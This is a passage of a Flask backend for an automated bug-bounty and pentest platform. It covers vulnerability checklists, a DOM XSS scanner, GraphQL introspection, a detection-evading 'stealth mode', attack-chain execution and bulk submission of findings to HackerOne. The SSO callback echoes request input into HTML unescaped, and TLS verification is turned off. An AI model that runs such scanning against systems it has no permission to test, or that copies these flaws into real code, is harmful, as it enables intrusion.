# ══════════════════════════════════════════════════════════════════════════════

_CHECKLISTS = {
    "owasp_top10": {
        "name": "OWASP Top 10 2021",
        "items": [
            {"id":"A01","name":"Broken Access Control","checks":["IDOR tested","Horizontal priv-esc","Vertical priv-esc","Direct object reference","Path traversal","CORS misconfig"],"bug_types":["idor","cors","lfi","mass_assign","redirect"]},
            {"id":"A02","name":"Cryptographic Failures","checks":["HTTP vs HTTPS","Weak TLS","Sensitive data in URL","PII in logs","Key exposure in JS"],"bug_types":["jsleak","expose","misconfig"]},
            {"id":"A03","name":"Injection","checks":["SQLi tested","XSS tested","Command injection","LDAP injection","CRLF injection"],"bug_types":["sqli","xss","rce","crlf","host_header","email_injection"]},
            {"id":"A04","name":"Insecure Design","checks":["Business logic tested","Race conditions","File upload","API rate limiting","Workflow bypass"],"bug_types":["business_logic","race_condition","fileupload","lfi"]},
            {"id":"A05","name":"Security Misconfiguration","checks":["Debug endpoints","Exposed admin panels","Default credentials","Error messages","CORS","Security headers"],"bug_types":["misconfig","expose","panels","actuator","cors"]},
            {"id":"A06","name":"Vulnerable Components","checks":["CVE scan run","Outdated libraries","Third-party JS","Nuclei templates run"],"bug_types":["cve","log4j","spring4shell","dep_confusion","takeover"]},
            {"id":"A07","name":"Auth & Identification Failures","checks":["MFA bypass tested","Weak passwords","JWT attacks","Session fixation","OAuth misconfig"],"bug_types":["jwt","mfa_bypass","oauth","saml","auth"]},
            {"id":"A08","name":"Software Integrity Failures","checks":["Deserialization tested","Supply chain","Unsigned updates","CI/CD security"],"bug_types":["deserialization","prototype","dep_confusion"]},
            {"id":"A09","name":"Logging Failures","checks":["Error pages reveal info","Stack traces","Log injection","Sensitive data logged"],"bug_types":["expose","misconfig"]},
            {"id":"A10","name":"SSRF","checks":["SSRF on all URL params","Cloud metadata","Internal network","DNS rebinding","PDF/img gen endpoints"],"bug_types":["ssrf","ssrf_cloud","ssrf_pdf"]},
        ]
    },
    "ptes": {
        "name": "PTES Technical Guidelines",
        "items": [
            {"id":"1","name":"Pre-engagement","checks":["Scope defined","Rules of engagement","Emergency contacts","Auth letter signed"],"bug_types":[]},
            {"id":"2","name":"Intelligence Gathering","checks":["Subdomain enum","OSINT","DNS recon","Shodan/Censys","Email harvest","Tech fingerprint"],"bug_types":[]},
            {"id":"3","name":"Threat Modeling","checks":["Asset inventory","Attack surface mapped","Business risk assessed","Chain potential identified"],"bug_types":[]},
            {"id":"4","name":"Vulnerability Analysis","checks":["Auto scan complete","Manual testing","Auth bypass tested","Logic flaws","Race conditions"],"bug_types":["xss","sqli","ssrf","lfi","idor","jwt","cors"]},
            {"id":"5","name":"Exploitation","checks":["PoC developed","Impact demonstrated","Data exfil tested","Privilege escalation","Lateral movement"],"bug_types":["rce","sqli","ssrf","deserialization"]},
            {"id":"6","name":"Post Exploitation","checks":["Access documented","Evidence collected","Cleanup plan","Persistence tested"],"bug_types":[]},
            {"id":"7","name":"Reporting","checks":["Executive summary","Technical findings","CVSS scores","Remediation roadmap","PoCs validated"],"bug_types":[]},
        ]
    }
}

@app.route("/checklist/<methodology>", methods=["GET"])
def get_checklist(methodology):
    """Get methodology checklist with auto-completion based on scan findings."""
    d        = request.args.get("domain","")
    findings = db.get_findings(_domain(d)) if d else []
    found_bugs = set(f.get("bug","").lower() for f in findings)
    checklist = _CHECKLISTS.get(methodology)
    if not checklist:
        return jsonify({"error":f"Unknown methodology: {methodology}. Use: {list(_CHECKLISTS.keys())}"}), 404

    # Auto-mark items as tested based on findings
    result = []
    for item in checklist["items"]:
        covered_bugs = [b for b in item.get("bug_types",[]) if b in found_bugs]
        tested_count = len(covered_bugs)
        total_count  = max(len(item.get("checks",[])), 1)
        result.append({
            **item,
            "auto_tested":     covered_bugs,
            "coverage_pct":    round(tested_count / max(len(item.get("bug_types",[]),1)) * 100),
            "status":          "tested" if covered_bugs else "not_tested",
        })

    return jsonify({"methodology": checklist["name"], "items": result,
                    "domain": d, "findings_used": len(findings)})

@app.route("/checklist", methods=["GET"])
def list_checklists():
    return jsonify({"checklists": [{"id":k,"name":v["name"]} for k,v in _CHECKLISTS.items()]})



# ══════════════════════════════════════════════════════════════════════════════
# SSO / OIDC — Google, GitHub, Microsoft, Okta, Generic OIDC
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/sso/providers", methods=["GET"])
def sso_providers():
    """List enabled SSO providers."""
    try:
        from engine.sso import get_enabled_providers, PROVIDERS
        enabled = get_enabled_providers()
        all_p   = [{"id":k,"name":v["name"],"icon":v["icon"],"enabled":False}
                   for k,v in PROVIDERS.items()]
        for p in all_p:
            if any(e["id"]==p["id"] for e in enabled):
                p["enabled"] = True
        return jsonify({"providers": all_p, "enabled_count": len(enabled)})
    except Exception as e:
        return jsonify({"error":str(e),"providers":[]}), 500

@app.route("/sso/login/<provider>", methods=["GET"])
def sso_login(provider):
    """Redirect to SSO provider auth page."""
    try:
        from engine.sso import build_auth_url
        redirect_uri = request.host_url.rstrip("/") + f"/sso/callback/{provider}"
        url = build_auth_url(provider, redirect_uri)
        if not url:
            return jsonify({"error":f"Provider '{provider}' not configured. Add SSO_{provider.upper()}_CLIENT_ID to .env"}), 400
        from flask import redirect
        return redirect(url)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/sso/callback/<provider>", methods=["GET"])
def sso_callback(provider):
    """Handle SSO OAuth2 callback."""
    code  = request.args.get("code","")
    state = request.args.get("state","")
    error = request.args.get("error","")
    if error:
        return f"<h1>SSO Error</h1><p>{error}</p>", 400
    if not code:
        return "<h1>No code received</h1>", 400
    try:
        from engine.sso import handle_callback
        from engine.rbac import create_user, login as rbac_login, _load_users, _save_users
        redirect_uri = request.host_url.rstrip("/") + f"/sso/callback/{provider}"
        user_info    = handle_callback(provider, code, state, redirect_uri)
        if not user_info:
            return "<h1>SSO Failed</h1><p>Could not retrieve user info</p>", 400

        # Auto-provision user from SSO
        users = _load_users()
        email = user_info.get("email","")
        username = email.split("@")[0] if email else user_info.get("name","sso_user").replace(" ","_").lower()

        existing = next((u for u in users.values() if
            u.get("email")==email or u.get("sso_id")==user_info.get("provider_id")), None)

        if not existing:
            # First SSO login — create account
            result = create_user(username, secrets.token_hex(16), "analyst",
                                  display_name=user_info.get("name",""),
                                  email=email)
            users  = _load_users()
            existing = users.get(username,{})

        # Log the SSO login
        try:
            from engine.audit_log import log_action
            log_action("sso_login", existing.get("username",username),
                       ip=request.remote_addr,
                       details={"provider":provider,"email":email})
        except Exception: pass

        # Create session
        from flask import session
        session["user"]     = existing.get("username", username)
        session["role"]     = existing.get("role","analyst")
        session["sso"]      = provider
        session.permanent   = True

        # Redirect to app
        from flask import redirect
        return redirect("/?sso=1")
    except Exception as e:
        log.error(f"SSO callback error: {e}")
        return f"<h1>SSO Error</h1><p>{e}</p>", 500


# ══════════════════════════════════════════════════════════════════════════════
# AUDIT LOG — SOC2 compliant immutable audit trail
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/audit/logs", methods=["GET"])
def audit_logs():
    """Query audit logs."""
    days     = int(request.args.get("days","7"))
    user     = request.args.get("user")
    action   = request.args.get("action")
    domain   = request.args.get("domain")
    severity = request.args.get("severity")
    limit    = int(request.args.get("limit","200"))
    try:
        from engine.audit_log import get_logs
        logs = get_logs(days=days, user=user, action=action,
                        domain=domain, severity=severity, limit=limit)
        return jsonify({"logs":logs, "count":len(logs)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/audit/stats", methods=["GET"])
def audit_stats():
    """Audit log statistics dashboard."""
    days = int(request.args.get("days","30"))
    try:
        from engine.audit_log import get_stats
        return jsonify(get_stats(days=days))
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/audit/verify", methods=["GET"])
def audit_verify():
    """Verify audit log chain integrity (tamper detection)."""
    days = int(request.args.get("days","1"))
    try:
        from engine.audit_log import verify_integrity
        return jsonify(verify_integrity(days=days))
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# DOM XSS — Playwright-powered browser scanner
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/scan/dom_xss", methods=["POST"])
def scan_dom_xss_route():
    """Run DOM XSS scan using real browser (Playwright)."""
    import queue as _q, threading
    payload = request.get_json(silent=True, force=True) or {}
    url     = payload.get("url","")
    d       = _domain(payload.get("domain","") or url)
    timeout = int(payload.get("timeout",30))
    stream  = payload.get("stream",True)

    if not url:
        return jsonify({"error":"url required"}), 400

    q = _q.Queue()

    def _run():
        try:
            from engine.dom_xss import scan_dom_xss
            q.put({"type":"dom_xss_start","url":url})
            findings = scan_dom_xss(url, timeout=timeout)
            for f in findings:
                f["domain"] = d
                db.add_finding(d, f)
                q.put({"type":"finding","finding":f})
            q.put({"type":"dom_xss_done","count":len(findings),"url":url})
        except Exception as e:
            q.put({"type":"error","msg":str(e)})
        finally:
            q.put(None)

    if not stream:
        threading.Thread(target=_run, daemon=True).start()
        # Wait up to timeout
        import time as _t; start = _t.time()
        results = []
        while _t.time() - start < timeout + 5:
            try:
                item = q.get(timeout=1)
                if item is None: break
                if item.get("type") == "finding": results.append(item["finding"])
            except: break
        return jsonify({"findings": results, "count": len(results)})

    threading.Thread(target=_run, daemon=True).start()
    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)
    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


# ══════════════════════════════════════════════════════════════════════════════
# API SCHEMA — Swagger/OpenAPI/GraphQL import
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/schema/discover", methods=["POST"])
def api_schema_discover():
    """Auto-discover API schemas (Swagger/OpenAPI/GraphQL) for a target."""
    payload  = request.get_json(silent=True, force=True) or {}
    url      = payload.get("url","") or ("https://" + payload.get("domain",""))
    try:
        from engine.api_schema import discover_schemas
        schemas = discover_schemas(url)
        return jsonify({"schemas":schemas, "count":len(schemas), "url":url})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/api/schema/parse", methods=["POST"])
def api_schema_parse():
    """Parse an OpenAPI schema and extract all endpoints for scanning."""
    payload = request.get_json(silent=True, force=True) or {}
    schema_url  = payload.get("schema_url","")
    schema_raw  = payload.get("schema_raw","")
    base_url    = payload.get("base_url","")

    if not schema_raw and schema_url:
        import urllib.request, ssl
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            with urllib.request.urlopen(schema_url, timeout=15, context=ctx) as r:
                schema_raw = r.read().decode("utf-8","ignore")
        except Exception as e:
            return jsonify({"error":f"Could not fetch schema: {e}"}), 400

    if not schema_raw:
        return jsonify({"error":"schema_url or schema_raw required"}), 400

    try:
        from engine.api_schema import parse_openapi
        parsed = parse_openapi(schema_raw)
        # Inject endpoints into DB
        d = _domain(base_url or payload.get("domain",""))
        if d and parsed.get("endpoints"):
            for ep in parsed["endpoints"]:
                full = (parsed.get("base_url","") or base_url.rstrip("/")) + ep["path"]
                if full.startswith("/"):
                    full = (base_url or "https://"+d).rstrip("/") + full
                db.add_endpoint(d, full)
        return jsonify(parsed)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/api/schema/graphql", methods=["POST"])
def api_schema_graphql():
    """Run GraphQL introspection and return full schema."""
    payload = request.get_json(silent=True, force=True) or {}
    url     = payload.get("url","")
    if not url:
        return jsonify({"error":"url required"}), 400
    try:
        from engine.api_schema import introspect_graphql
        result = introspect_graphql(url)
        return jsonify(result or {"error":"Introspection disabled or endpoint not GraphQL"})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# ATTACK GRAPH — D3.js visual attack chain graph
# ══════════════════════════════════════════════════════════════════════════════


@app.route("/notify_test", methods=["POST"])
def notify_test():
    try:
        from engine.notify import get_notifier
        n = get_notifier()
        results = n.test()
        return jsonify({"results": results, "configured": n.configured})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/notify_status")
def notify_status():
    try:
        from engine.notify import get_notifier
        n = get_notifier()
        return jsonify({
            "configured":  n.configured,
            "slack":       bool(n.slack_webhook),
            "discord":     bool(n.discord_webhook),
            "telegram":    bool(n.telegram_token and n.telegram_chat),
            "min_severity":n.min_severity,
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Fingerprint auto-select ───────────────────────────────────────────────────
@app.route("/fingerprint")
def fingerprint():
    d = _domain(request.args.get("domain",""))
    try:
        from engine.fingerprint import auto_select_bugs_from_db
        result = auto_select_bugs_from_db(d, db)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Stealth mode ──────────────────────────────────────────────────────────────
@app.route("/stealth_mode", methods=["POST"])
def stealth_mode():
    payload = request.get_json(silent=True, force=True) or {}
    mode = payload.get("mode","normal")
    try:
        from engine.stealth import set_stealth_mode, StealthEngine
        set_stealth_mode(mode)
        return jsonify({"ok": True, "mode": mode,
                        "modes": list(StealthEngine.MODES.keys())})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Screenshots ───────────────────────────────────────────────────────────────

# ── HackerOne / Bugcrowd submission ──────────────────────────────────────────
@app.route("/h1/mass_ingest", methods=["POST", "GET"])
def h1_mass_ingest():
    """
    POST /h1/mass_ingest
    Start mass ingestion of ALL public disclosed HackerOne reports.
    Sources: H1 Hacktivity GraphQL + reddelexc/hackerone-reports GitHub repo.

    Body: {
        "max_reports": 500000,   (default: all)
        "resume": true,          (default: always resume from checkpoint)
        "sources": ["hacktivity", "reddelexc", "all_writeups"]
    }

    GET /h1/mass_ingest → returns current ingest status and progress
    """
    if request.method == "GET":
        # Return current ingest status
        try:
            from engine.h1_ingest import db_stats as h1_stats
            from engine.rag_db import stats as rag_stats
            h1 = h1_stats()
            rag = rag_stats()
            # Check if ingest thread is running
            import threading
            running = any(t.name.startswith("h1-mass-ingest") for t in threading.enumerate())
            return jsonify({
                "running":      running,
                "h1_reports":   h1.get("total_reports", 0),
                "rag_reports":  rag.get("total_reports", 0),
                "rag_embedded": rag.get("embedded", 0),
                "by_bug_type":  rag.get("by_bug_type", {}),
                "by_severity":  h1.get("by_severity", {}),
                "by_program":   dict(list(h1.get("by_program", {}).items())[:10]),
                "sources_done": h1.get("by_source", {}),
            })
        except Exception as e:
            return jsonify({"error": str(e), "running": False})

    # POST — start ingestion
    payload     = request.get_json(silent=True, force=True) or {}
    max_reports = int(payload.get("max_reports", 500000))
    resume      = bool(payload.get("resume", True))
    sources     = payload.get("sources", ["hacktivity", "reddelexc", "all_writeups"])

    import threading as _thr_mass

    # Check if already running
    already = any(t.name.startswith("h1-mass-ingest") for t in _thr_mass.enumerate())
    if already:
        return jsonify({"ok": False, "message": "Mass ingest already running. GET /h1/mass_ingest for status."})

    def _run_mass():
        try:
            log.info(f"[mass_ingest] starting — max={max_reports}, sources={sources}")

            # Phase 1: H1 Hacktivity GraphQL (live disclosed reports)
            if "hacktivity" in sources or "all" in sources:
                from engine.h1_ingest import run_ingest
                log.info("[mass_ingest] Phase 1: H1 Hacktivity GraphQL")
                result = run_ingest(
                    max_reports=max_reports,
                    resume=resume,
                    build_index=False,    # build index once at end
                    also_feed_rag=True,
                    batch_embed=500,
                )
                log.info(f"[mass_ingest] Phase 1 done: {result}")

            # Phase 2: reddelexc/hackerone-reports full repo
            if "reddelexc" in sources or "all" in sources:
                from engine.rag_ingest import run_source
                from engine.rag_db import embed_pending, build_index
                log.info("[mass_ingest] Phase 2: reddelexc/hackerone-reports full repo")
                r2 = run_source("h1-top-reports")
                log.info(f"[mass_ingest] Phase 2 done: {r2}")
                n2 = embed_pending()
                log.info(f"[mass_ingest] Phase 2 embedded: {n2}")

            # Phase 3: Additional writeup repos
            if "all_writeups" in sources or "all" in sources:
                from engine.rag_ingest import run_all, SOURCES
                writeup_sources = [
                    "h1-valid-reports", "holmes-summaries", "kh4sh3i-writeups",
                    "rclue-reports", "marcotulio-reports", "gobeecode-reports",
                    "dod-reports", "imusabkhan-writeups", "bidokhti-h1reports",
                    "codebygk-reports", "h1pmnh-reports", "phlmox-reports",
                    "0xpatrik-writeups", "jhaddix-content", "ngalongc-reference",
                    "payloads-all-things", "owasp-cheatsheets", "edoverflow-takeover",
                    "nahamsec-resources",
                ]
                log.info(f"[mass_ingest] Phase 3: {len(writeup_sources)} writeup repos")
                r3 = run_all(writeup_sources, embed_after=True)
                log.info(f"[mass_ingest] Phase 3 done: {r3}")

            # Final: rebuild full index
            from engine.rag_db import build_index
            log.info("[mass_ingest] Final: rebuilding search index...")
            build_index()

            log.info("[mass_ingest] ALL DONE")
        except Exception as e:
            log.error(f"[mass_ingest] error: {e}", exc_info=True)

    t = _thr_mass.Thread(target=_run_mass, daemon=True, name="h1-mass-ingest-main")
    t.start()

    return jsonify({
        "ok":           True,
        "message":      "Mass ingest started",
        "sources":      sources,
        "max_reports":  max_reports,
        "resume":       resume,
        "poll":         "/h1/mass_ingest",
        "estimate":     {
            "hacktivity_reports": "~200,000+ (all public disclosed)",
            "reddelexc_reports":  "~15,000+ (curated full text)",
            "writeup_repos":      "~30,000+ (19 GitHub repos)",
            "total_target":       "~500,000+",
            "time_estimate":      "4-8 hours (resumable — safe to interrupt)",
            "rate":               "~25 reports per 0.8s from H1 GraphQL",
        },
    })


@app.route("/h1/status")
def h1_status():
    return jsonify(get_submitter().status())


# ── Intigriti submission ──────────────────────────────────────────────────────
@app.route("/intigriti/submit", methods=["POST"])
def intigriti_submit():
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    finding  = payload.get("finding",{})
    program  = payload.get("program_handle","")
    try:
        from engine.reporter import generate_intigriti_report
        report_md = generate_intigriti_report(finding, d)
        return jsonify({"ok": True, "report": report_md,
                        "note": "Copy this report to Intigriti submission form"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Bugcrowd submission ──────────────────────────────────────────────────────
@app.route("/bugcrowd/submit", methods=["POST"])
def bugcrowd_submit():
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    finding  = payload.get("finding",{})
    try:
        from engine.reporter import generate_bugcrowd_report
        report_md = generate_bugcrowd_report(finding, d)
        return jsonify({"ok": True, "report": report_md,
                        "note": "Copy this report to Bugcrowd submission form"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Auto-submit critical findings to H1 ───────────────────────────────────────
@app.route("/h1/auto_submit", methods=["POST"])
def h1_auto_submit():
    """Auto-submit all critical/high findings for a domain to HackerOne."""
    payload     = request.get_json(silent=True, force=True) or {}
    d           = _domain(payload.get("domain",""))
    program     = payload.get("program_handle","")
    min_sev     = payload.get("min_severity","critical")
    dry_run     = payload.get("dry_run", True)  # default dry run for safety

    if not program:
        return jsonify({"error": "program_handle required"}), 400

    findings = db.get_findings(d)
    sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
    min_order = sev_order.get(min_sev, 0)

    eligible = [f for f in findings
                if sev_order.get(f.get("severity","info"),4) <= min_order
                and not f.get("submitted_h1")]

    if dry_run:
        return jsonify({
            "dry_run": True,
            "would_submit": len(eligible),
            "findings": [{"title": f.get("title","")[:80],
                          "severity": f.get("severity",""),
                          "bug": f.get("bug","")} for f in eligible[:10]]
        })

    # Actually submit
    submitted = []
    failed    = []
    try:
        from engine.h1 import get_submitter
        from engine.reporter import generate_h1_report
        s = get_submitter()
        chains = db.get_chains(d)
        for f in eligible[:20]:  # cap at 20
            try:
                report_md = generate_h1_report(f, d, chains)
                result    = s.submit_report(f, d, program, report_md)
                if result.get("id"):
                    submitted.append({"title": f.get("title","")[:60],
                                      "report_id": result["id"]})
                    f["submitted_h1"] = True
                    db.save_findings(d, findings)
            except Exception as fe:
                failed.append({"title": f.get("title","")[:60], "error": str(fe)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    return jsonify({"submitted": len(submitted), "failed": len(failed),
                    "results": submitted, "errors": failed})

@app.route("/h1/test", methods=["POST"])
def h1_test():
    try:
        return jsonify(get_submitter().test())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# /h1/programs GET → handled below by h1_programs_by_bug()
@app.route("/h1/submit", methods=["POST"])
def h1_submit():
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    finding  = payload.get("finding",{})
    program  = payload.get("program_handle","")
    platform = payload.get("platform","h1")
    chains   = db.get_chains(d)
    try:
        from engine.reporter import generate_h1_report
        report_md = generate_h1_report(finding, d, chains)
        s = get_submitter()
        if platform == "bugcrowd":
            result = s.submit_to_bugcrowd(finding, d, report_md,
                                          payload.get("program_id",""))
        else:
            result = s.submit_to_h1(finding, d, report_md, program)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/h1/bulk_submit", methods=["POST"])
def h1_bulk_submit():
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    program  = payload.get("program_handle","")
    min_sev  = payload.get("min_severity","high")
    platform = payload.get("platform","h1")
    if not program:
        return jsonify({"error":"missing program_handle"}), 400
    findings = db.get_findings(d)
    chains   = db.get_chains(d)
    sev_order = ["info","low","medium","high","critical"]
    min_idx   = sev_order.index(min_sev) if min_sev in sev_order else 3
    eligible  = [f for f in findings
                 if sev_order.index(f.get("severity","info")) >= min_idx]
    results   = []
    s         = get_submitter()
    for finding in eligible[:20]:  # cap at 20
        try:
            from engine.reporter import generate_h1_report
            rmd = generate_h1_report(finding, d, chains)
            if platform == "bugcrowd":
                r = s.submit_to_bugcrowd(finding, d, rmd, payload.get("program_id",""))
            else:
                r = s.submit_to_h1(finding, d, rmd, program)
            results.append(r)
            time.sleep(2)  # rate limit
        except Exception as e:
            results.append({"success":False,"error":str(e)})
    submitted = sum(1 for r in results if r.get("success"))
    return jsonify({"submitted":submitted,"failed":len(results)-submitted,"results":results})

# ── Screenshots ───────────────────────────────────────────────────────────────
@app.route("/screenshot", methods=["GET","POST"])
def take_screenshots():
    payload = request.get_json(silent=True, force=True) or {} if request.method == "POST" else {}
    d       = _domain(payload.get("domain","") or request.args.get("domain",""))
    limit   = int(payload.get("limit", request.args.get("limit", 50)))
    q_obj   = queue.Queue()

    hosts = db.get_hosts(d).get("active",[])[:limit]
    if not hosts:
        # Return SSE with error
        def err_stream():
            yield f"data: {json.dumps({'type':'error','msg':'No live hosts — run recon first'})}\n\n"
        return Response(err_stream(), mimetype="text/event-stream",
                        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

    ss_dir  = str(DATA_DIR / "screenshots" / d.replace("/","_"))
    engine  = get_screenshot_engine(ss_dir)

    def _progress(r):
        q_obj.put({"type":"screenshot",
                   "url":   r.get("url",""),
                   "file":  r.get("file",""),
                   "has_image": bool(r.get("base64") or r.get("data_url"))})

    def _run():
        try:
            res = engine.screenshot_all(hosts, progress_cb=_progress)
            db.save_screenshots(d, res)
            q_obj.put({"type":"screenshots_done","count":len(res)})
        except Exception as e:
            q_obj.put({"type":"error","msg":str(e)})
            q_obj.put({"type":"screenshots_done","count":0})

    t = threading.Thread(target=_run, daemon=True, name=f"screenshot-{d}")
    t.start()

    def stream():
        while True:
            try:
                item = q_obj.get(timeout=engine.timeout + 10)
                yield f"data: {json.dumps(item)}\n\n"
                if item.get("type") in ("screenshots_done","error"): break
            except queue.Empty:
                yield ": keepalive\n\n"

    return Response(stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route("/screenshots")
def get_screenshots():
    d    = _domain(request.args.get("domain",""))
    file = request.args.get("file","")
    if file:
        # Serve actual screenshot image file
        ss_dir = DATA_DIR / "screenshots" / d.replace("/","_")
        img_path = ss_dir / file
        if img_path.exists():
            mime = "image/svg+xml" if file.endswith(".svg") else "image/png"
            return Response(img_path.read_bytes(), mimetype=mime)
        return "", 404
    return jsonify({"screenshots": db.get_screenshots(d)})

@app.route("/screenshot/gallery")
def screenshot_gallery():
    d = _domain(request.args.get("domain",""))
    screenshots = db.get_screenshots(d)
    engine = get_screenshot_engine()
    html = engine.get_gallery_html(screenshots, d)
    return Response(html, mimetype="text/html")

# ── Diff / Monitoring ─────────────────────────────────────────────────────────
@app.route("/diff/snapshot", methods=["POST"])
def diff_snapshot():
    d = _domain((request.get_json(silent=True, force=True) or {}).get("domain","") or request.args.get("domain",""))
    try:
        snap = MONITOR.save_snapshot(d, db)
        return jsonify({"ok":True,"ts":snap["ts"],
                        "subs":snap["subs_count"],"active":snap["active_count"]})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/diff/latest")
def diff_latest():
    d = _domain(request.args.get("domain",""))
    try:
        diff = MONITOR.latest_diff(d, db)
        if not diff:
            return jsonify({"message":"First snapshot saved — run again after next scan"})
        return jsonify(diff)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/diff/snapshots")
def diff_snapshots():
    d = _domain(request.args.get("domain",""))
    return jsonify({"snapshots": MONITOR.list_snapshots(d)})

@app.route("/diff/compare")
def diff_compare():
    d       = _domain(request.args.get("domain",""))
    idx_old = int(request.args.get("old","0"))
    idx_new = int(request.args.get("new","-1"))
    snaps   = MONITOR.get_snapshots(d)
    if idx_new == -1: idx_new = max(0, len(snaps)-1)
    try:
        diff = MONITOR.diff_between(d, idx_old, idx_new)
        if not diff: return jsonify({"error":"invalid snapshot indices"}), 400
        return jsonify(diff)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

# ── AI Escalate ───────────────────────────────────────────────────────────────



@app.route("/escalate", methods=["POST"])
def escalate():
    """Escalate findings — SSE streaming AI security report generation."""
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))

    findings  = db.get_findings(d)
    chains    = db.get_chains(d)
    meta      = db.get_meta(d)
    hosts     = db.get_hosts(d)
    tech      = db.get_tech(d)
    endpoints = db.get_endpoints(d, limit=500)
    ports     = hosts.get("ports",[])
    enrich    = hosts.get("enriched",[])
    
    recon = {
        "subs":      hosts.get("subs_count",0),
        "live":      hosts.get("active_count",0),
        "endpoints": db.count_endpoints(d),
        "tech":      tech,
        "ports":     ports[:50],
        "enrich":    enrich[:20],
    }

    import queue as _q, threading as _t

    q = _q.Queue()

    def _generate():
        try:
            from engine.ai_analyst import generate_full_pentest_report
            generate_full_pentest_report(d, findings, chains, recon, endpoints, q)
        except Exception as e:
            q.put({"type":"error","msg":str(e)})
        finally:
            q.put(None)  # sentinel

    _t.Thread(target=_generate, daemon=True).start()

    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)

    return Response(_stream(), mimetype="text/event-stream")


@app.route("/escalate_json", methods=["POST"])
def escalate_json():
    """Non-streaming version for compatibility."""
    from engine.ai_analyst import generate_executive_summary
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    findings = db.get_findings(d)
    chains   = db.get_chains(d)
    meta     = db.get_meta(d)
    hosts    = db.get_hosts(d)
    recon    = {
        "subs":      hosts.get("subs_count",0),
        "live":      hosts.get("active_count",0),
        "endpoints": db.count_endpoints(d),
        "tech":      db.get_tech(d),
    }
    try:
        report = generate_executive_summary(d, findings, chains, recon, meta)
        db.save_report(d, report)
        return jsonify({"report": report})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Session status ────────────────────────────────────────────────────────────
@app.route("/session_status")
def session_status():
    d    = _domain(request.args.get("domain",""))
    sess = _sess(d)
    recon_alive = sess["recon_t"] is not None and sess["recon_t"].is_alive()
    scan_alive  = sess["scan_t"]  is not None and sess["scan_t"].is_alive()
    meta        = db.get_meta(d)
    # Get real-time counts for UI panels
    try:
        _hosts = db.get_hosts(d)
        _subs_count    = _hosts.get("subs_count", 0)
        _live_count    = _hosts.get("active_count", 0)
        _ends_count    = db.count_endpoints(d)
        _findings_list = db.get_findings(d)
        _finds_count   = len(_findings_list)
        _crits         = sum(1 for f in _findings_list if f.get("severity")=="critical")
    except Exception:
        _subs_count=_live_count=_ends_count=_finds_count=_crits=0

    return jsonify({
        # Flat format (for internal use)
        "recon_alive": recon_alive,
        "scan_alive":  scan_alive,
        # Live counts — what the KPI counters show
        "subs":      _subs_count,
        "live":      _live_count,
        "endpoints": _ends_count,
        "findings":  _finds_count,
        "critical":  _crits,
        # Nested format (what frontend expects)
        "recon": {"alive": recon_alive, "meta": meta.get("recon_opts",{})},
        "scan":  {"alive": scan_alive},
        "waf":      sess.get("waf") or meta.get("waf"),
        "asn":      sess.get("asn") or meta.get("asn"),
        "js_files": len(sess.get("js",[])),
        "chains":   len(sess.get("chains",[])),
    })

@app.route("/chain_execute", methods=["POST"])
def chain_execute():
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    chain_id = payload.get("chain_id","")
    chains   = db.get_chains(d)
    chain    = next((c for c in chains if c.get("id")==chain_id), None)
    if not chain:
        return jsonify({"error":"chain not found"}), 404
    try:
        from engine.chain_exec import execute_chain
        findings = db.get_findings(d)
        sess     = _sess(d)
        auth_s   = sess["auth"].get_session() if sess["auth"].is_authenticated() else None
        result   = execute_chain(chain, findings, auth_s)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/nuclei_templates", methods=["POST"])
def nuclei_templates():
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    try:
        from engine.nuclei_gen import generate_all
        findings = db.get_findings(d)
        paths    = generate_all(findings, d)
        return jsonify({"generated": len(paths), "paths": paths})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/cicd_scan", methods=["POST"])
def cicd_scan():
    """CI/CD API endpoint — trigger scan with API key auth."""
    api_key = request.headers.get("X-API-Key","") or request.json.get("api_key","")
